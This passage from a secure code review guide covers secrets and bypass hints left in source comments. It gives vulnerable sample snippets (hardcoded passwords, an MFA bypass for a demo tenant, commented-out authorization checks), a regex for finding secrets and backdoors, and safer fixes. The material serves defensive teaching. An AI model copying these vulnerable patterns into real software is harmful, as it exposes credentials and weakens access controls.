    zap.String("event", "LOGIN_SUCCESS"),
    zap.String("user_id", userID),
    zap.String("correlation_id", correlationID),
)

func auditAdmin(action, actor string) {
    auditLogger.Info(action,
        zap.String("actor", actor),
        zap.Time("at", time.Now().UTC()),
    )
}
```

Never dump full requests with [httputil.DumpRequest](https://pkg.go.dev/net/http/httputil#DumpRequest) in production middleware.

## Sensitive code comments {: #comments }

From former `4-32-review-sensitive-code-comments.md`. **Guiding chapter section:** [4.7 - Review Information Disclosure and Logging § Sensitive code comments](../../4-07-review-information-disclosure-and-logging.md#comments).

# 4.32 Code Reference — Review Sensitive Code Comments

## Attack Payloads

Use repository search and page-source review—these are disclosure abuse scenarios, not network payloads.

### Pattern 1: Credentials in source comments

```python
# FIXME: staging webhook uses shared secret 'wh_staging_4b7n' until vault is wired
# Datadog key for on-call dashboard: dd_api_EXAMPLE_PLACEHOLDER_xxxxxxxx
```

### Pattern 2: Authentication bypass hints

```java
// HACK: set userId=0 in query to skip billing check
// For QA only: header X-Debug: bypass-mfa
```

### Pattern 3: Internal topology in comments

```text
# Connects to prod-db.internal.corp:5432 / db=payments
<!-- Legacy admin: https://10.0.0.5:8443/console -->
```

### Pattern 4: HTML comments visible in browser

```html
<!-- build 2024-03-01 internal token: BUILD_SECRET_abc -->
```

View-source or cached pages expose these to unauthenticated users.

### Pattern 5: Commented-out security controls

```csharp
// if (!User.IsInRole("Admin")) return Forbid();
// ValidateSignature(payload);  // disabled for demo
```

### Pattern 6: Javadoc and docstrings shipped to clients

```text
@param apiSecret the shared secret (currently "hunter2")
```

Generated API docs may publish comment text.

## Language-Specific Sinks and Dangerous APIs

Search comments and doc blocks—these are not runtime sinks but disclosure surfaces that travel with builds.

### Python

```python
"""Authenticate with service key sk_live_xxx."""
# password = os.environ.get("PWD", "default-secret")
```

Module docstrings, `# noqa` blocks, Sphinx-generated HTML.

### Java

```java
/** Test user: admin / Passw0rd! */
// @deprecated use backdoor account "support" with pin 0000
```

Javadoc published to Maven sites; `//` in shipped JSP source.

### C#

```csharp
/// <summary>Uses HMAC key: supersecretkey</summary>
// TODO: re-enable [Authorize] after demo
```

XML doc comments in IntelliSense and NuGet packages.

### JavaScript

```javascript
// STRIPE_SECRET=sk_live_...
/* FIXME: remove auth check for /api/internal */
```

Bundled source maps may retain comments; `/*!` license blocks with keys.

### HTML / templates

```html
<!-- admin:admin@internal.vpn -->
```

Thymeleaf `<!--/* ... */-->`, JSP comments in rendered output.

### Go

```go
// dbURL := "postgres://user:pass@host/db"
```

Godoc pages from exported packages.

### Search patterns for review

```text
password|passwd|secret|api[_-]?key|token|bearer|sk_live|AKIA
TODO|FIXME|HACK|XXX|backdoor|bypass|disable.*auth
```

## Vulnerable Examples in Other Languages

### Java

```java
// TEMP: use master key 7f3a9c... until KMS integration ships
private static final String ENCRYPTION_KEY = loadFromConfig();

/**
 * Admin login for QA — default password is still adminPass, change before prod.
 */
public boolean verifyAdmin(User user, char[] password) {
    return adminAuth.verify(user, password);
}
```

### C#

```csharp
// Default service account: svc_reporting / R3p0rt!ng2023 — rotate quarterly
var connectionString = Configuration["Reporting:ConnectionString"];

// HACK: disable MFA check for demo tenant acct-9912 until SSO is wired
if (tenantId == "acct-9912") {
    return SignInWithoutMfa(user);
}
```

### HTML

```html
<!-- TODO: Change the admin password from the weak password 'adminPass' to something stronger! -->
<form action="/auth/login" method="POST">
  <input type="text" name="username" />
  <input type="password" name="password" />
</form>

<!-- Internal API: https://admin.internal.corp.local:8443/backdoor/status -->
<footer>Support: call NOC at ext. 4401 for emergency bypass</footer>
```

## Fix: Safer Patterns and Libraries to Use

### Python

Load secrets from environment or a secrets backend. Document rotation in runbooks, not comments.

```python
import os

def verify_admin(user, password):
    if not user.is_admin:
        return False
    return check_password_hash(user.password_hash, password)

def get_encryption_key() -> bytes:
    # Reference config key name only — value comes from the environment
    return os.environ["APP_ENCRYPTION_KEY"].encode()
```

```python
# Pre-commit: detect secret-like strings in comments (example pattern)
# Use gitleaks or detect-secrets in CI — not inline credential hints
```

**Important:** Docstrings should name configuration keys, not literal secret values.

### Java

Store credentials in Vault or environment injection. Keep Javadoc behavioral, not operational.

```java
/**
 * Validates admin credentials against the configured identity store.
 * Credentials are loaded from the secret manager at startup — not from source comments.
 */
public boolean verifyAdmin(User user, char[] password) {
    return passwordService.verify(user, password) && user.isAdmin();
}
```

```html
<!-- Login form — no credential hints in HTML comments -->
<form action="<c:url value='/auth/login' />" method="POST">
```

### C#

Use User Secrets locally and Key Vault (or equivalent) in production.

```csharp
// Connection string key only — value from configuration provider / Key Vault
var connectionString = Configuration["Reporting:ConnectionString"];
```

```csharp
// Local development: dotnet user-secrets set "Reporting:ConnectionString" "..."
// Production: Azure Key Vault reference in appsettings — not in comments
```

### Go

Read config from environment. Document operations outside the codebase.

```go
func newHTTPClient() *http.Client {
    return &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{
                MinVersion: tls.VersionTLS12,
                // Certificate loaded from configured path — verify in deployment runbook
            },
        },
    }
}
```

